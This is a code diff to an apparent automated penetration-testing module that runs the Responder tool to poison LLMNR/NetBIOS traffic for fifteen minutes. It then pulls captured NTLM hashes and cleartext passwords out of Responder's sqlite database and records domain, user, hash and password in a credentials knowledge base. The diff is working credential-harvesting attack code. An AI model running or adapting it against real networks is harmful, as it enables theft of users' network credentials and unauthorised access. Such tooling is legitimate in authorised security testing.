@@ -1,5 +1,3 @@
-import re
-import time
 import datetime
 from core.actionModule import actionModule
 from core.utils import Utils
@@ -38,34 +36,33 @@ class responder(actionModule):
         temp_file2 = self.config["proofsDir"] + self.shortName + "_" + Utils.getRandStr(10)
         command = "python " + responder_path + "Responder.py -I " + default_interface + " -i " + my_ip + " -wrf"
         # run for 15 minutes
-        # result = Utils.execWait(command, temp_file, timeout=900)
         start_time = '{:%d-%m-%Y %H:%M:%S}'.format(datetime.datetime.now())
-        result = Utils.execWait(command, temp_file1, timeout=60)
-        #time.sleep(60)
+        result = Utils.execWait(command, temp_file1, timeout=900)
         responder_db = responder_path + "Responder.db"
+        #STDOUT unreliable, grabbed hashes directly from the DB instead
         command = "sqlite3 " + responder_db + " \"select * from responder where timestamp > '" + start_time + "'\""
         result = Utils.execWait(command, temp_file2, timeout=10)
         times_run += 1
-        for part in result.splitlines():
-            found_hash = True #Found a hash, set to true to prevent loop
-            #Looking for output ---
-            #01/01/2001 01:00:00 PM - [HTTP] NTLM[v2/-SSP] Hash     : username::domain:etc...
-            #split by :, limit to 4 splits, take last section
-            record = part.split('|')
-            method = record[1]
-            hashtype = record[2]
-            host = record[3]
-            username = record[5]
-            domain = username.split('\\')[0]
-            user = username.split('\\')[1]
-            cleartext = record[6]
-            shorthash = record[7]
-            fullhash = record[8]
-            self.display.error("Vuln [NetBIOS|LLMNR] Found new hash - ", fullhash)
-            self.addVuln(host, "NetBIOS|LLMNR", {"port": "445", "output": temp_file2.replace("/", "%2F")})
-            kb.add("domain/" + domain + "/" + user + "/" + hashtype + "/" + fullhash)
-            if len(cleartext) > 0:
-                kb.add("creds/host/" + host + "/port/445/service/smb/username/" + user + "/password/" + cleartext)
+        #Have to account for responder not creating a new db file if nothing was found
+        if not "no such table" in result:
+            for part in result.splitlines():
+                found_hash = True #Found a hash, set to true to prevent loop
+                record = part.split('|')
+                if len(record) > 0:
+                    method = record[1]
+                    hashtype = record[2]
+                    host = record[3]
+                    username = record[5]
+                    domain = username.split('\\')[0]
+                    user = username.split('\\')[1]
+                    cleartext = record[6]
+                    shorthash = record[7]
+                    fullhash = record[8]
+                    self.display.error("Vuln [NetBIOS|LLMNR] Found new hash - ", fullhash)
+                    self.addVuln(host, "NetBIOS|LLMNR", {"port": "445", "output": temp_file2.replace("/", "%2F")})
+                    kb.add("domain/" + domain + "/" + user + "/" + hashtype + "/" + fullhash)
+                    if len(cleartext) > 0:
+                        kb.add("creds/host/" + host + "/port/445/service/smb/username/" + user + "/password/" + cleartext)
 
             #if not found_hash:
             #    time.sleep(300) # sleep for 5 minutes
